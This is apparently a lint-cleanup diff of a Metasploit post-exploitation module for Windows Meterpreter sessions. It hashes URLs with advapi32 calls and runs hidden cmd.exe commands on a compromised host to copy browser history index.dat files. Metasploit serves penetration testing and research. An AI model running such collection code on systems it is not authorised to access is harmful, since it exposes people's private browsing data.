@@ -23,6 +23,11 @@ class MetasploitModule < Msf::Post
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
         'Author' => ['Kx499'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -213,18 +218,16 @@ class MetasploitModule < Msf::Post
 
   def hash_url(url)
     rg_advapi = session.railgun.advapi32
-    tail = 0
     prov = 'Microsoft Enhanced Cryptographic Provider v1.0'
-    flag = 0xF0000000
     context = rg_advapi.CryptAcquireContextW(4, nil, prov, 1, 0xF0000000)
     h = rg_advapi.CryptCreateHash(context['phProv'], 32772, 0, 0, 4)
-    hdata = rg_advapi.CryptHashData(h['phHash'], url, (url.length + 1) * 2, 0)
+    rg_advapi.CryptHashData(h['phHash'], url, (url.length + 1) * 2, 0)
     hparam = rg_advapi.CryptGetHashParam(h['phHash'], 2, 20, 20, 0)
     hval_arr = hparam['pbData'].unpack('C*')
     hval = hparam['pbData'].unpack('H*')[0]
     rg_advapi.CryptDestroyHash(h['phHash'])
     rg_advapi.CryptReleaseContext(context['phProv'], 0)
-    tail = hval_arr.inject(0) { |s, v| s += v }
+    tail = hval_arr.inject(0) { |s, v| s + v }
     htail = ('%02x' % tail)[-2, 2]
     return "#{hval}#{htail}"
   end
@@ -295,7 +298,7 @@ class MetasploitModule < Msf::Post
       print_line("\tFile: #{hpath}")
       # copy file
       cmd = "cmd.exe /c type \"#{hpath}\" > \"#{base}\\index.dat\""
-      r = session.sys.process.execute(cmd, nil, { 'Hidden' => true })
+      session.sys.process.execute(cmd, nil, { 'Hidden' => true })
 
       # loop until cmd is done
       # while session.sys.process.each_process.find { |i| i["pid"] == r.pid}
@@ -315,7 +318,7 @@ class MetasploitModule < Msf::Post
       print_line("\tFile: #{cpath}")
       # copy file
       cmd = "cmd.exe /c type \"#{cpath}\" > \"#{base}\\index.dat\""
-      r = session.sys.process.execute(cmd, nil, { 'Hidden' => true })
+      session.sys.process.execute(cmd, nil, { 'Hidden' => true })
 
       # loop until cmd is done
       # while session.sys.process.each_process.find { |i| i["pid"] == r.pid}
